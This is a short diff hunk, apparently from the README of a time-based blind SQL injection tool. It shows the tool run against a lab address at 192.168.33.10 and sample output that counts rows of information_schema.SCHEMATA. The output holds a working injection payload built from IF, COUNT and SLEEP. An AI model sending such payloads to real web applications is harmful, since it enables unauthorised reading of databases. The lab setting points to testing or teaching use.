@@ -10,7 +10,7 @@ python time_based_blind_sql_injection.py -u "http://192.168.33.10/sqli/time_base
 * Average response time: 0 s
 * Using sleep time: 0 s
 
-
+```
 Determinating number of rows of table: SCHEMATA
 
 {to: 1 AND IF((SELECT COUNT(*) FROM information_schema.SCHEMATA)=0,SLEEP(0.155797244898),SLEEP(0))}
